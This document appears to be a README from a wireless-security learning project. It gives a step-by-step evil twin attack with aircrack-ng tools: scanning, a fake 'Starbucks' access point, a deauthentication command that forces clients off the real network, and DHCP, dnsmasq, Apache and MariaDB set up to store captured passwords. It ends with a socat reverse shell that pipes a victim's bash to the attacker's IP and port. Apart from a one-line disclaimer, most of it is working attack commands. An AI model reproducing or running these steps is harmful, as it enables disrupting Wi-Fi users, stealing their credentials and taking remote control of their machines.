# 前言  ![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg)

仅供参考,此project为学习之用,了解破解流程,学习无线安全

The recording file is in the link below:

https://drive.google.com/open?id=1EdF8AQh95s0FsDAZry5Uj2Y-TkjsgGOC

system : kali linux

software : aiicrack-ng dnsmasq
## Task2 

Evil Twin AP Attack: Set up a fake AP impersonating the target AP, and force target AP users to connect to it.

### 1. start wireless card monitor mode 

```
airmon-ng start wlan0
```

(wlan0 is the port of the wireless network card,it can be check by inputing `ifconfig` or `iwconfig`)

### 2. checking wireless AP(access point)

```
airodump-ng wlan0mon
```
(the prot been changed to wlan0mon after starting monitor mode)

this command can list all the information about AP ,Station and the traffic between them

you can see the name in the table 

BSSID : the MAC address of the AP

PWR : Signal strength

Beacons : one of the management frames, theo purpose of it is to transmit periodically, they serve to announce the presence of a wireless LAN and to synchronise the members of the service set.

Data : the throughput of the AP 

CH : channel

ENC : Encrept protocol 

ESSID : the name of AP

#### in case the channel will change over time,set the stable channel 
```
airodump-ng -c 11 -i wlan0 --bssid C4:71:54:23:2A:AE 
```

-c : channel number ,in this case , i choose 11

-i : choose the card to monitor 

--bssid : the MAC address of target AP

this command only show the traffic between client and target AP

## 3. Set up a fake AP impersonating the target AP

the client will be disconnected from the AP we input above 

```
airbase-ng -a AA:AA:AA:AA:AA:AA --essid 'Starbucks' -c 11 wlan0mon
```

-a :set up MAC address (this is optional)

-essid : the name of AP ,this should be same as the target WI-FI

-c : channel 11 (this is optional)

## 4. deauth target by using aireplay-ng
```
aireplay-ng -0 0 -a C4:71:54:23:2A:AE -c EC:D0:9F:87:DD:6F  wlan0mon
```

-0 : Conflict attack mode , follow by the attack times , 0 represent all the times

-a : the MAC of AP  , this can be captured from the `airodump-ng wlan0mon`

-c : the client that connect to AP legally. if not spcecif which client , it will disconnect all the clients which connect to this WI-FI



###  DHCP server 

1. install DHCP server

```
sudo apt install -y isc-dhcp-server
```
2.modify DHCP conf file

type the command below in your terminal

```
vi /etc/dhcp/dhcpd.conf
```
change the content or uncomment the content as follow

```
authoritative;
default-lease-wime 600;
max-lease-time 7200;
subnet 192.168.1.128 netmask 255.255.255.128 {
option subnet-mask 255.255.255.128;
option broadcast 192.168.1.255;
option routers 192.168.1.129;
option domain-name-servers 8.8.8.8;
range 192.168.1.130 192.168.1.140;
}
```
launch the DHCP server ,

in kali , use command,

```
 dhcpd -cf /etc/dhcp/dhcpd.conf
```

after that ,type command below

start web server Apache

```
/etc/init.d/apache2.start
``` 
 
4.install mysql-server for storing captured password
 
```
apt-get install mariadb-server
```
Actually, for Kali Linux the apt-get install mysql-server command will not work, but try with apt-get install mariadb-server.
 
This will install MySQL
 
after installation ,type
 
```
/etc/init.d/mysql start
```

5.Install dnsmasq in Kali Linux

```
apt-get update
apt-get install dnsmasq -y
```
This will update the cache and install latest version of dhcp server in your Kali Linux box.

Now all the required tools are installed. We need to configure apache and the dhcp server so that the access point will 

allocate the IP address to the client/victim and the client would be able to access our webpage remotely.

Now we will define the IP range and the subnet mask for the DHCP server.

6.Configure dnsmasq

Create a configuration file for dnsmasq using `vim` or your favorite text editor and add the following code.

```
vi ./conf/dnsmasq.conf
```
dnsmasq.conf

```
interface=at0         
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```

```
Tip: Replace at0 with wlan0 everywhere when hostapd is used for creating an access point
```


###  Reverse shell

1. install socat 

Type the command in your terminal

```
apt-get install socat
```
2. in victim machine
in this case 

VICTIM IP：192.168.1.107

KALI IP：192.168.1.102

Type command

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.102:4444
```
Just change the victimIP with your target IP

and in the attcker machine which is kali

Type command

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
